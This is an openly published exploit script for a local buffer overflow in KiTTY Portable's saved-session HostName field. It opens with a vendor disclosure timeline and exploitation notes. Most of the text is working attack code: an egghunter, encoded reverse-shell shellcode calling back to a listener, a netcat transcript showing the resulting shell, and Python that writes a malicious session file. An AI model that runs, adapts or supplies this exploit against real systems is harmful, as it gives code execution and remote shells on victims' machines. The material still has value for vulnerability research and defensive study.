# Exploit Title: KiTTY Portable <= 0.65.1.1p Local Saved Session Overflow (Egghunter XP, DoS 7/8.1/10)
# Date: 28/12/2015
# Exploit Author: Guillaume Kaddouch
#	Twitter: @gkweb76
#	Blog: http://networkfilter.blogspot.com
#	GitHub: https://github.com/gkweb76/exploits
# Vendor Homepage: http://www.9bis.net/kitty/
# Software Link: http://sourceforge.net/projects/portableapps/files/KiTTY%20Portable/KiTTYPortable_0.65.0.2_English.paf.exe
# Version: 0.65.0.2p
# Tested on: Windows XP SP3 x86 (FR), Windows 7 Pro x64 (FR), Windows 8.1 Pro x64 (FR), Windows 10 Pro x64 (FR)
# Category: Local


"""
Disclosure Timeline:
--------------------
2015-09-13: Vulnerability discovered
2015-09-26: Vendor contacted
2015-09-28: Vendor answer
2015-10-09: KiTTY 0.65.0.3p released, still vulnerable
2015-10-20: KiTTY 0.65.1.1p released, still vulnerable
2015-11-15: KiTTY 0.66.6.1p released, seems fixed
2015-12-28: exploit published

Description :
-------------
A local overflow exists in the session file used by KiTTY portable, in the HostName parameter. It is possible to write
an overly long string to trigger an overflow. It can be used to trigger code execution on Windows XP SP3, or to crash
the program from Windows 7 to Windows 10. It has been tested with KiTTY portable 0.65.0.2p/0.65.0.3p/0.65.1.1p, but earlier versions are
likely to be vulnerable too.

WinXP  -> Local Code Execution
Win7   -> Denial Of Service
Win8.1 -> Denial Of Service
Win10  -> Denial Of Service

Instructions:
-------------
- Run exploit
- Launch KiTTY, select "EvilSession" on the session list, then click "Load".

Exploitation:
-------------
When writing a 1500 bytes string to the HostName parameter in a session file, EIP is overwritten at offset 1232.
As ESP points to our buffer, we use an address doing a JMP ESP in an unprotected DLL. However, as the memory area
we land in is not reliable for bigger shellcode such as reverse shell, using an egg hunter is required. The final
shellcode is written into another session parameter, LogFileName. After successful exploitation, a reverse shell
is given if this payload has been selected on Windows XP SP3 (on Windows 7/8.1/10, KiTTY crashes):

guillaume@kali64:~/tools$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.135.131] from (UNKNOWN) [192.168.135.130] 1955
Microsoft Windows XP [version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\kitty\App\KiTTY>

"""

egg = "w00t" # \x77\x30\x30\x74

# Windows NtAccessCheckAndAuditAlarm EggHunter
# Size: 32 bytes
egghunter = (
"\x66\x81\xca\xff\x0f"	# or dx,0x0fff
"\x42"					# inc edx
"\x52"					# push edx
"\x6a\x02"				# push byte +0x02
"\x58"					# pop eax
"\xcd\x2e"				# int 0x2e
"\x3c\x05"				# cmp al,0x5
"\x5a"					# pop edx
"\x74\xef"				# jz 0x0
"\xb8\x77\x30\x30\x74"	# mov eax,0x74303077 ; egg
"\x8b\xfa"				# mov edi,edx
"\xaf"					# scasd
"\x75\xea"				# jnz 0x5
"\xaf"					# scasd
"\x75\xe7"				# jnz 0x5
"\xff\xe7"				# jmp edi
)

# Metasploit Reverse Shell 192.168.135.131:4444 (replace it with any shellcode you want)
# Encoder: x86/shikata_ga_nai
# Bad chars: '\x00\x0a\x0d\x5c'
# Size: 351 bytes
shellcode = (
"\xb8\xa9\xbf\xda\xcb\xdd\xc0\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xee\xfc\x31\x46\x0e\x03\xef\xb1\x38\x3e\x13\x25\x3e"
"\xc1\xeb\xb6\x5f\x4b\x0e\x87\x5f\x2f\x5b\xb8\x6f\x3b\x09\x35"
"\x1b\x69\xb9\xce\x69\xa6\xce\x67\xc7\x90\xe1\x78\x74\xe0\x60"
"\xfb\x87\x35\x42\xc2\x47\x48\x83\x03\xb5\xa1\xd1\xdc\xb1\x14"
"\xc5\x69\x8f\xa4\x6e\x21\x01\xad\x93\xf2\x20\x9c\x02\x88\x7a"
"\x3e\xa5\x5d\xf7\x77\xbd\x82\x32\xc1\x36\x70\xc8\xd0\x9e\x48"
"\x31\x7e\xdf\x64\xc0\x7e\x18\x42\x3b\xf5\x50\xb0\xc6\x0e\xa7"
"\xca\x1c\x9a\x33\x6c\xd6\x3c\x9f\x8c\x3b\xda\x54\x82\xf0\xa8"
"\x32\x87\x07\x7c\x49\xb3\x8c\x83\x9d\x35\xd6\xa7\x39\x1d\x8c"
"\xc6\x18\xfb\x63\xf6\x7a\xa4\xdc\x52\xf1\x49\x08\xef\x58\x06"
"\xfd\xc2\x62\xd6\x69\x54\x11\xe4\x36\xce\xbd\x44\xbe\xc8\x3a"
"\xaa\x95\xad\xd4\x55\x16\xce\xfd\x91\x42\x9e\x95\x30\xeb\x75"
"\x65\xbc\x3e\xd9\x35\x12\x91\x9a\xe5\xd2\x41\x73\xef\xdc\xbe"
"\x63\x10\x37\xd7\x0e\xeb\xd0\x18\x66\x74\xa3\xf1\x75\x7a\xb5"
"\x5d\xf3\x9c\xdf\x4d\x55\x37\x48\xf7\xfc\xc3\xe9\xf8\x2a\xae"
"\x2a\x72\xd9\x4f\xe4\x73\x94\x43\x91\x73\xe3\x39\x34\x8b\xd9"
"\x55\xda\x1e\x86\xa5\x95\x02\x11\xf2\xf2\xf5\x68\x96\xee\xac"
"\xc2\x84\xf2\x29\x2c\x0c\x29\x8a\xb3\x8d\xbc\xb6\x97\x9d\x78"
"\x36\x9c\xc9\xd4\x61\x4a\xa7\x92\xdb\x3c\x11\x4d\xb7\x96\xf5"
"\x08\xfb\x28\x83\x14\xd6\xde\x6b\xa4\x8f\xa6\x94\x09\x58\x2f"
"\xed\x77\xf8\xd0\x24\x3c\x08\x9b\x64\x15\x81\x42\xfd\x27\xcc"
"\x74\x28\x6b\xe9\xf6\xd8\x14\x0e\xe6\xa9\x11\x4a\xa0\x42\x68"
"\xc3\x45\x64\xdf\xe4\x4f"
)

junk 	= '\x41' * 1232
ret 	= '\x7B\x46\x86\x7C' # 0x7C86467B / jmp esp / kernel32.dll
nops 	= '\x90' * 8
eggmark = egg * 2
padding = '\x42' * (1500 - len(junk) - len(ret) - len(egghunter))

payload1 = junk + ret + egghunter + padding # Egg Hunter
payload2 = eggmark + nops + shellcode		# Final Shellcode

# A whole KiTTY session file, written to \Sessions\EvilSession"
buffer  = "PortKnocking\\\\\r"
buffer += "ACSinUTF\\0\\\r"
buffer += "Comment\\\\\r"
buffer += "CtrlTabSwitch\\0\\\r"
buffer += "Password\\1350b\\\r"
buffer += "ForegroundOnBell\\0\\\r"
buffer += "SaveWindowPos\\0\\\r"
buffer += "WindowState\\0\\\r"
buffer += "TermYPos\\-1\\\r"
buffer += "TermXPos\\-1\\\r"
buffer += "LogTimeRotation\\0\\\r"
buffer += "Folder\\Default\\\r"
buffer += "AutocommandOut\\\\\r"
buffer += "Autocommand\\\\\r"
buffer += "LogTimestamp\\\\\r"
buffer += "AntiIdle\\\\\r"
buffer += "ScriptfileContent\\\\\r"
buffer += "Scriptfile\\\\\r"
buffer += "SFTPConnect\\\\\r"
buffer += "IconeFile\\\\\r"
buffer += "Icone\\1\\\r"
buffer += "SaveOnExit\\0\\\r"
buffer += "Fullscreen\\0\\\r"
buffer += "Maximize\\0\\\r"
buffer += "SendToTray\\0\\\r"
buffer += "TransparencyValue\\0\\\r"
buffer += "zDownloadDir\\C%3A%5C\\\r"
buffer += "szOptions\\-e%20-v\\\r"
buffer += "szCommand\\\\\r"
buffer += "rzOptions\\-e%20-v\\\r"
buffer += "rzCommand\\\\\r"
buffer += "CygtermCommand\\\\\r"
buffer += "Cygterm64\\0\\\r"
buffer += "CygtermAutoPath\\1\\\r"
buffer += "CygtermAltMetabit\\0\\\r"
buffer += "HyperlinkRegularExpression\\(((https%3F%7Cftp)%3A%5C%2F%5C%2F)%7Cwww%5C.)(([0-9]+%5C.[0-9]+%5C.[0-9]+%5C.[0-9]+)%7Clocalhost%7C([a-zA-Z0-9%5C-]+%5C.)%2A[a-zA-Z0-9%5C-]+%5C.(com%7Cnet%7Corg%7Cinfo%7Cbiz%7Cgov%7Cname%7Cedu%7C[a-zA-Z][a-zA-Z]))(%3A[0-9]+)%3F((%5C%2F%7C%5C%3F)[^%20%22]%2A[^%20,;%5C.%3A%22%3E)])%3F\\\r"
buffer += "HyperlinkRegularExpressionUseDefault\\1\\\r"
buffer += "HyperlinkBrowser\\\\\r"
buffer += "HyperlinkBrowserUseDefault\\1\\\r"
buffer += "HyperlinkUseCtrlClick\\1\\\r"
buffer += "HyperlinkUnderline\\0\\\r"
buffer += "FailureReconnect\\0\\\r"
buffer += "WakeupReconnect\\0\\\r"
buffer += "SSHManualHostKeys\\\\\r"
buffer += "ConnectionSharingDownstream\\1\\\r"
buffer += "ConnectionSharingUpstream\\1\\\r"
buffer += "ConnectionSharing\\0\\\r"
buffer += "WindowClass\\\\\r"
buffer += "SerialFlowControl\\1\\\r"
buffer += "SerialParity\\0\\\r"
buffer += "SerialStopHalfbits\\2\\\r"
buffer += "SerialDataBits\\8\\\r"
buffer += "SerialSpeed\\9600\\\r"
buffer += "SerialLine\\COM1\\\r"
buffer += "ShadowBoldOffset\\1\\\r"
buffer += "ShadowBold\\0\\\r"
buffer += "WideBoldFontHeight\\0\\\r"
buffer += "WideBoldFontCharSet\\0\\\r"
buffer += "WideBoldFontIsBold\\0\\\r"
buffer += "WideBoldFont\\\\\r"
buffer += "WideFontHeight\\0\\\r"
buffer += "WideFontCharSet\\0\\\r"
buffer += "WideFontIsBold\\0\\\r"
buffer += "WideFont\\\\\r"
buffer += "BoldFontHeight\\0\\\r"
buffer += "BoldFontCharSet\\0\\\r"
buffer += "BoldFontIsBold\\0\\\r"
buffer += "BoldFont\\\\\r"
buffer += "ScrollbarOnLeft\\0\\\r"
buffer += "LoginShell\\1\\\r"
buffer += "StampUtmp\\1\\\r"
buffer += "BugChanReq\\0\\\r"
buffer += "BugWinadj\\0\\\r"
buffer += "BugOldGex2\\0\\\r"
buffer += "BugMaxPkt2\\0\\\r"
buffer += "BugRekey2\\0\\\r"
buffer += "BugPKSessID2\\0\\\r"
buffer += "BugRSAPad2\\0\\\r"
buffer += "BugDeriveKey2\\0\\\r"
buffer += "BugHMAC2\\0\\\r"
buffer += "BugIgnore2\\0\\\r"
buffer += "BugRSA1\\0\\\r"
buffer += "BugPlainPW1\\0\\\r"
buffer += "BugIgnore1\\0\\\r"
buffer += "PortForwardings\\\\\r"
buffer += "RemotePortAcceptAll\\0\\\r"
buffer += "LocalPortAcceptAll\\0\\\r"
buffer += "X11AuthFile\\\\\r"
buffer += "X11AuthType\\1\\\r"
buffer += "X11Display\\\\\r"
buffer += "X11Forward\\0\\\r"
buffer += "BlinkText\\0\\\r"
buffer += "BCE\\1\\\r"
buffer += "LockSize\\0\\\r"
buffer += "EraseToScrollback\\1\\\r"
buffer += "ScrollOnDisp\\1\\\r"
buffer += "ScrollOnKey\\0\\\r"
buffer += "ScrollBarFullScreen\\0\\\r"
buffer += "ScrollBar\\1\\\r"
buffer += "CapsLockCyr\\0\\\r"
buffer += "Printer\\\\\r"
buffer += "UTF8Override\\1\\\r"
buffer += "CJKAmbigWide\\0\\\r"
buffer += "LineCodePage\\\\\r"
buffer += "Wordness224\\2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,2,2,2\\\r"
buffer += "Wordness192\\2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,2,2,2\\\r"
buffer += "Wordness160\\1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1\\\r"
buffer += "Wordness128\\1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1\\\r"
buffer += "Wordness96\\1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,1,1,1,1\\\r"
buffer += "Wordness64\\1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,1,1,1,2\\\r"
buffer += "Wordness32\\0,1,2,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,2,2,2,1,1,1,1,1,1\\\r"
buffer += "Wordness0\\0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\\\r"
buffer += "MouseOverride\\1\\\r"
buffer += "RectSelect\\0\\\r"
buffer += "MouseIsXterm\\0\\\r"
buffer += "PasteRTF\\0\\\r"
buffer += "RawCNP\\0\\\r"
buffer += "Colour33\\187,187,187\\\r"
buffer += "Colour32\\0,0,0\\\r"
buffer += "Colour31\\187,187,187\\\r"
buffer += "Colour30\\0,187,187\\\r"
buffer += "Colour29\\187,0,187\\\r"
buffer += "Colour28\\0,0,187\\\r"
buffer += "Colour27\\187,187,0\\\r"
buffer += "Colour26\\0,187,0\\\r"
buffer += "Colour25\\187,0,0\\\r"
buffer += "Colour24\\0,0,0\\\r"
buffer += "Colour23\\0,0,0\\\r"
buffer += "Colour22\\187,187,187\\\r"
buffer += "Colour21\\255,255,255\\\r"
buffer += "Colour20\\187,187,187\\\r"
buffer += "Colour19\\85,255,255\\\r"
buffer += "Colour18\\0,187,187\\\r"
buffer += "Colour17\\255,85,255\\\r"
buffer += "Colour16\\187,0,187\\\r"
buffer += "Colour15\\85,85,255\\\r"
buffer += "Colour14\\0,0,187\\\r"
buffer += "Colour13\\255,255,85\\\r"
buffer += "Colour12\\187,187,0\\\r"
buffer += "Colour11\\85,255,85\\\r"
buffer += "Colour10\\0,187,0\\\r"
buffer += "Colour9\\255,85,85\\\r"
buffer += "Colour8\\187,0,0\\\r"
buffer += "Colour7\\85,85,85\\\r"
buffer += "Colour6\\0,0,0\\\r"
buffer += "Colour5\\0,255,0\\\r"
buffer += "Colour4\\0,0,0\\\r"
buffer += "Colour3\\85,85,85\\\r"
buffer += "Colour2\\0,0,0\\\r"
buffer += "Colour1\\255,255,255\\\r"
buffer += "Colour0\\187,187,187\\\r"
buffer += "SelectedAsColour\\0\\\r"
buffer += "UnderlinedAsColour\\0\\\r"
buffer += "BoldAsColourTest\\1\\\r"
buffer += "DisableBottomButtons\\1\\\r"
buffer += "WindowHasSysMenu\\1\\\r"
buffer += "WindowMaximizable\\1\\\r"
buffer += "WindowMinimizable\\1\\\r"
buffer += "WindowClosable\\1\\\r"
buffer += "BoldAsColour\\1\\\r"
buffer += "Xterm256Colour\\1\\\r"
buffer += "ANSIColour\\1\\\r"
buffer += "TryPalette\\0\\\r"
buffer += "UseSystemColours\\0\\\r"
buffer += "FontVTMode\\4\\\r"
buffer += "FontQuality\\0\\\r"
buffer += "FontHeight\\10\\\r"
buffer += "FontCharSet\\0\\\r"
buffer += "FontIsBold\\0\\\r"
buffer += "Font\\Courier%20New\\\r"
buffer += "TermHeight\\24\\\r"
buffer += "TermWidth\\80\\\r"
buffer += "WinTitle\\\\\r"
buffer += "WinNameAlways\\1\\\r"
buffer += "DisableBidi\\0\\\r"
buffer += "DisableArabicShaping\\0\\\r"
buffer += "CRImpliesLF\\0\\\r"
buffer += "LFImpliesCR\\0\\\r"
buffer += "AutoWrapMode\\1\\\r"
buffer += "DECOriginMode\\0\\\r"
buffer += "ScrollbackLines\\10000\\\r"
buffer += "BellOverloadS\\5000\\\r"
buffer += "BellOverloadT\\2000\\\r"
buffer += "BellOverloadN\\5\\\r"
buffer += "BellOverload\\1\\\r"
buffer += "BellWaveFile\\\\\r"
buffer += "BeepInd\\0\\\r"
buffer += "Beep\\1\\\r"
buffer += "BlinkCur\\0\\\r"
buffer += "CurType\\0\\\r"
buffer += "WindowBorder\\1\\\r"
buffer += "SunkenEdge\\0\\\r"
buffer += "HideMousePtr\\0\\\r"
buffer += "FullScreenOnAltEnter\\0\\\r"
buffer += "AlwaysOnTop\\0\\\r"
buffer += "Answerback\\KiTTY\\\r"
buffer += "LocalEdit\\2\\\r"
buffer += "LocalEcho\\2\\\r"
buffer += "TelnetRet\\1\\\r"
buffer += "TelnetKey\\0\\\r"
buffer += "CtrlAltKeys\\1\\\r"
buffer += "ComposeKey\\0\\\r"
buffer += "AltOnly\\0\\\r"
buffer += "AltSpace\\0\\\r"
buffer += "AltF4\\1\\\r"
buffer += "NetHackKeypad\\0\\\r"
buffer += "ApplicationKeypad\\0\\\r"
buffer += "ApplicationCursorKeys\\0\\\r"
buffer += "NoRemoteCharset\\0\\\r"
buffer += "NoDBackspace\\0\\\r"
buffer += "RemoteQTitleAction\\1\\\r"
buffer += "NoRemoteWinTitle\\0\\\r"
buffer += "NoAltScreen\\0\\\r"
buffer += "NoRemoteResize\\0\\\r"
buffer += "NoMouseReporting\\0\\\r"
buffer += "NoApplicationCursors\\0\\\r"
buffer += "NoApplicationKeys\\0\\\r"
buffer += "LinuxFunctionKeys\\0\\\r"
buffer += "RXVTHomeEnd\\0\\\r"
buffer += "BackspaceIsDelete\\1\\\r"
buffer += "PassiveTelnet\\0\\\r"
buffer += "RFCEnviron\\0\\\r"
buffer += "RemoteCommand\\\\\r"
buffer += "PublicKeyFile\\\\\r"
buffer += "SSH2DES\\0\\\r"
buffer += "SshProt\\3\\\r"
buffer += "SshNoShell\\0\\\r"
buffer += "GSSCustom\\\\\r"
buffer += "GSSLibs\\gssapi32,sspi,custom\\\r"
buffer += "AuthGSSAPI\\1\\\r"
buffer += "AuthKI\\1\\\r"
buffer += "AuthTIS\\0\\\r"
buffer += "SshBanner\\1\\\r"
buffer += "SshNoAuth\\0\\\r"
buffer += "RekeyBytes\\1G\\\r"
buffer += "RekeyTime\\60\\\r"
buffer += "KEX\\dh-gex-sha1,dh-group14-sha1,dh-group1-sha1,rsa,WARN\\\r"
buffer += "Cipher\\aes,blowfish,3des,WARN,arcfour,des\\\r"
buffer += "ChangeUsername\\0\\\r"
buffer += "GssapiFwd\\0\\\r"
buffer += "AgentFwd\\0\\\r"
buffer += "TryAgent\\1\\\r"
buffer += "Compression\\0\\\r"
buffer += "NoPTY\\0\\\r"
buffer += "LocalUserName\\\\\r"
buffer += "UserNameFromEnvironment\\0\\\r"
buffer += "UserName\\\\\r"
buffer += "Environment\\\\\r"
buffer += "ProxyTelnetCommand\\connect%20%25host%20%25port%5Cn\\\r"
buffer += "ProxyPassword\\\\\r"
buffer += "ProxyUsername\\\\\r"
buffer += "ProxyPort\\80\\\r"
buffer += "ProxyHost\\proxy\\\r"
buffer += "ProxyMethod\\0\\\r"
buffer += "ProxyLocalhost\\0\\\r"
buffer += "ProxyDNS\\1\\\r"
buffer += "ProxyExcludeList\\\\\r"
buffer += "AddressFamily\\0\\\r"
buffer += "TerminalModes\\CS7=A,CS8=A,DISCARD=A,DSUSP=A,ECHO=A,ECHOCTL=A,ECHOE=A,ECHOK=A,ECHOKE=A,ECHONL=A,EOF=A,EOL=A,EOL2=A,ERASE=A,FLUSH=A,ICANON=A,ICRNL=A,IEXTEN=A,IGNCR=A,IGNPAR=A,IMAXBEL=A,INLCR=A,INPCK=A,INTR=A,ISIG=A,ISTRIP=A,IUCLC=A,IXANY=A,IXOFF=A,IXON=A,KILL=A,LNEXT=A,NOFLSH=A,OCRNL=A,OLCUC=A,ONLCR=A,ONLRET=A,ONOCR=A,OPOST=A,PARENB=A,PARMRK=A,PARODD=A,PENDIN=A,QUIT=A,REPRINT=A,START=A,STATUS=A,STOP=A,SUSP=A,SWTCH=A,TOSTOP=A,WERASE=A,XCASE=A\\\r"
buffer += "TerminalSpeed\\38400,38400\\\r"
buffer += "TerminalType\\xterm\\\r"
buffer += "TCPKeepalives\\0\\\r"
buffer += "TCPNoDelay\\1\\\r"
buffer += "PingIntervalSecs\\0\\\r"
buffer += "PingInterval\\0\\\r"
buffer += "WarnOnClose\\1\\\r"
buffer += "CloseOnExit\\1\\\r"
buffer += "PortNumber\\22\\\r"
buffer += "Protocol\\ssh\\\r"
buffer += "SSHLogOmitData\\0\\\r"
buffer += "SSHLogOmitPasswords\\1\\\r"
buffer += "LogFlush\\1\\\r"
buffer += "LogFileClash\\-1\\\r"
buffer += "LogType\\0\\\r"
buffer += "LogFileName\\" + payload2 + "\\\r"	# Shellcode
buffer += "HostName\\" + payload1 + "\\\r"		# Egg Hunter
buffer += "Present\\1\\\r"
buffer += "LogHost\\\\\r"

# Location of our evil session file (modify with your KiTTY directory)
file = "C:\\kitty\\App\\KiTTY\\Sessions\\EvilSession"
try:
	print "\n[*] Writing to %s (%s bytes)" % (file, len(buffer))
	f = open(file,'w')
	f.write(buffer)
	f.close()
	print "[*] Done!"
except:
    print "[-] Error writing %s" % file